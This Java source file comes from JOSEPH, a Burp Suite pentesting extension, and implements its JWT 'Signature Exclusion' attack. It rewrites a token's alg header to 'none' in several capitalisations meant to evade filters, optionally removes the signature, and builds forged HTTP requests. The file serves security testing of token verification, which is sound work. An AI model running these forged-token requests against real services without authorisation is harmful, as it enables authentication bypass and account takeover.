/**
 * JOSEPH - JavaScript Object Signing and Encryption Pentesting Helper
 * Copyright (C) 2016 Dennis Detering
 * <p>
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * <p>
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * <p>
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301, USA.
 */
package eu.dety.burp.joseph.attacks.signature_exclusion;

import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.IRequestInfo;
import eu.dety.burp.joseph.attacks.AttackPreparationFailedException;
import eu.dety.burp.joseph.attacks.IAttackInfo;
import eu.dety.burp.joseph.utilities.Decoder;
import eu.dety.burp.joseph.utilities.JoseParameter;

import javax.swing.*;
import java.awt.*;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * Signature Exclusion Attack Info
 * <p>
 * Class holding meta data for the Signature Exclusion attack and for preparing all necessary parameter for the actual attack.
 *
 * @author Dennis Detering
 * @version 1.0
 */
public class SignatureExclusionInfo implements IAttackInfo {
    private IExtensionHelpers helpers;
    private IHttpRequestResponse requestResponse;
    private JoseParameter parameter;

    // Unique identifier for the attack class
    private static final String id = "signature_exclusion";

    // Full name of the attack
    private static final String name = "Signature Exclusion";

    // Attack description
    private static final String description = "<html>The <em>Signature Exclusion</em> attack tries to get the token mistakenly verified "
            + "by using the <em>None</em> algorithm and (optionally) removing the signature.<br/>"
            + "In order to perform filter evasion, different capitalization is used as algorithm value.</html>";

    // Hashmap of "none" algorithm type variations
    private static final HashMap<PayloadType, String> noneAlgVariations = new HashMap<>();
    static {
        noneAlgVariations.put(PayloadType.LOWERCASE, "none");
        noneAlgVariations.put(PayloadType.CAPITALIZED, "None");
        noneAlgVariations.put(PayloadType.UPPERCASE, "NONE");
        noneAlgVariations.put(PayloadType.MIXED, "nOnE");

        noneAlgVariations.put(PayloadType.LOWERCASE_WITH_SIGNATURE, "none");
        noneAlgVariations.put(PayloadType.CAPITALIZED_WITH_SIGNATURE, "None");
        noneAlgVariations.put(PayloadType.UPPERCASE_WITH_SIGNATURE, "NONE");
        noneAlgVariations.put(PayloadType.MIXED_WITH_SIGNATURE, "nOnE");
    }

    // Hashmap of available payloads with a verbose name (including the
    // PayloadType)
    private static final HashMap<String, PayloadType> payloads = new HashMap<>();
    static {
        for (Map.Entry<PayloadType, String> noneAlgVariation : noneAlgVariations.entrySet()) {

            String payloadName = noneAlgVariation.getValue();
            if (noneAlgVariation.getKey().toString().endsWith("_WITH_SIGNATURE")) {
                payloadName = payloadName + " (with signature)";
            }

            payloads.put(String.format("Alg: %s (0x%02X)", payloadName, noneAlgVariation.getKey().ordinal()), noneAlgVariation.getKey());
        }
    }

    // Amount of requests needed
    private static final int amountRequests = noneAlgVariations.size();

    // Types of payload variation
    enum PayloadType {
        LOWERCASE,
        CAPITALIZED,
        UPPERCASE,
        MIXED,

        LOWERCASE_WITH_SIGNATURE,
        CAPITALIZED_WITH_SIGNATURE,
        UPPERCASE_WITH_SIGNATURE,
        MIXED_WITH_SIGNATURE
    }

    // List of SignatureExclusionsAttackRequest objects holding prepared attack
    // requests
    private List<SignatureExclusionAttackRequest> requests = new ArrayList<>();

    public SignatureExclusionInfo(IBurpExtenderCallbacks callbacks) {
        this.helpers = callbacks.getHelpers();
    }

    @Override
    public SignatureExclusion prepareAttack(IBurpExtenderCallbacks callbacks, IHttpRequestResponse requestResponse, IRequestInfo requestInfo,
            JoseParameter parameter) throws AttackPreparationFailedException {
        this.requestResponse = requestResponse;
        this.parameter = parameter;

        this.requests.clear();

        for (Map.Entry<PayloadType, String> noneAlgVariation : noneAlgVariations.entrySet()) {
            try {
                // Change the "alg" header value for each of the
                // noneAlgVariation entries
                // and rebuild a valid request
                String[] tmpComponents = Decoder.getComponents(this.parameter.getJoseValue());
                String tmpDecodedHeader = Decoder.getDecoded(tmpComponents[0]);
                String tmpReplaced = tmpDecodedHeader.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariation.getValue() + "\"");
                String tmpReplacedEncoded = Decoder.getEncoded(tmpReplaced);

                String tmpSignature = "";
                String payloadName = noneAlgVariation.getValue();
                if (noneAlgVariation.getKey().toString().endsWith("_WITH_SIGNATURE")) {
                    tmpSignature = tmpComponents[2];
                    payloadName = payloadName + " (with signature)";
                }

                String[] tmpNewComponents = { tmpReplacedEncoded, tmpComponents[1], tmpSignature };

                String tmpParameterValue = Decoder.concatComponents(tmpNewComponents);

                byte[] tmpRequest = JoseParameter.updateRequest(this.requestResponse.getRequest(), this.parameter, helpers, tmpParameterValue);
                requests.add(new SignatureExclusionAttackRequest(tmpRequest, noneAlgVariation.getKey().ordinal(), payloadName));

            } catch (Exception e) {
                throw new AttackPreparationFailedException("Attack preparation failed. Message: " + e.getMessage());
            }
        }

        return new SignatureExclusion(callbacks, this);
    }

    @Override
    public String getId() {
        return id;
    }

    @Override
    public String getName() {
        return name;
    }

    @Override
    public String getDescription() {
        return description;
    }

    @Override
    public int getAmountRequests() {
        return amountRequests;
    }

    @Override
    public boolean getExtraUI(JPanel extraPanel, GridBagConstraints constraints) {
        return false;
    }

    @Override
    public boolean isSuitable(JoseParameter.JoseType type, String algorithm) {
        return (type == JoseParameter.JoseType.JWS);
    }

    @Override
    public IHttpRequestResponse getRequestResponse() {
        return this.requestResponse;
    }

    @Override
    public List<SignatureExclusionAttackRequest> getRequests() {
        return this.requests;
    }

    @Override
    public HashMap<String, PayloadType> getPayloadList() {
        return payloads;
    }

    @Override
    public HashMap<String, String> updateValuesByPayload(Enum payloadTypeId, String header, String payload, String signature) {
        HashMap<String, String> result = new HashMap<>();

        result.put("header", header.replaceFirst("\"alg\":\"(.+?)\"", "\"alg\":\"" + noneAlgVariations.get(payloadTypeId) + "\""));
        result.put("payload", payload);

        if (payloadTypeId.toString().endsWith("_WITH_SIGNATURE")) {
            result.put("signature", signature);
        } else {
            result.put("signature", "");
        }

        return result;
    }

}
